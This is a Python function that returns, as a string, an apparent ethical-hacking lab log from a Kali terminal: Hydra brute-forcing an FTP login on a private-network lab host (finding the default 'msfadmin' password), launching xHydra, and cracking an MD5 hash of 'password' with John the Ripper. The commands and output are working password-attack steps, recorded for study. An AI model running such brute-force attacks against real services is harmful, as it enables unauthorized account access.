def passwordCrack():
    return [
        """

===================================================
5 a) Online Password Cracking with Hydra, xHydra.
==================================================

──(mohan㉿kali)-[~]
└─$ hydra -l msfadmin -P eh.txt ftp://192.168.44.131
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-23 09:28:20
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:1/p:9), ~1 try per task
[DATA] attacking ftp://192.168.44.131:21/
[21][ftp] host: 192.168.44.131   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-23 09:28:24
                                                                             
┌──(mohan㉿kali)-[~]
└─$ xhydra

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: GFileInfo created without time::modified

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: file ../../../gio/gfileinfo.c: line 1887 (g_file_info_get_modification_time): should not be reached

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: GFileInfo created without time::modified

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: file ../../../gio/gfileinfo.c: line 1887 (g_file_info_get_modification_time): should not be reached

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: GFileInfo created without time::modified

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: file ../../../gio/gfileinfo.c: line 1887 (g_file_info_get_modification_time): should not be reached

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.094: GFileInfo created without time::modified

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.094: file ../../../gio/gfileinfo.c: line 1887 (g_file_info_get_modification_time): should not be reached


====================================================
5 b) Offline Password Cracking with John the ripper
====================================================

┌──(mohan㉿kali)-[~]
└─$ john
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 AVX2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ echo -n "password" |md5sum
5f4dcc3b5aa765d61d8327deb882cf99  -
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ echo " 5f4dcc3b5aa765d61d8327deb882cf99" >hash.txt
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ cat hash.txt
 5f4dcc3b5aa765d61d8327deb882cf99
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ echo -e " abc\n12345678\nuser\npassword\npass123" > normal.txt
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ cat normal.txt
 abc
12345678
user
password
pass123
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ john --format=raw-md5 normal.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
password         (?)     
1g 0:00:00:00 DONE 2/3 (2025-07-29 10:38) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..larry
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ 



"""
    ]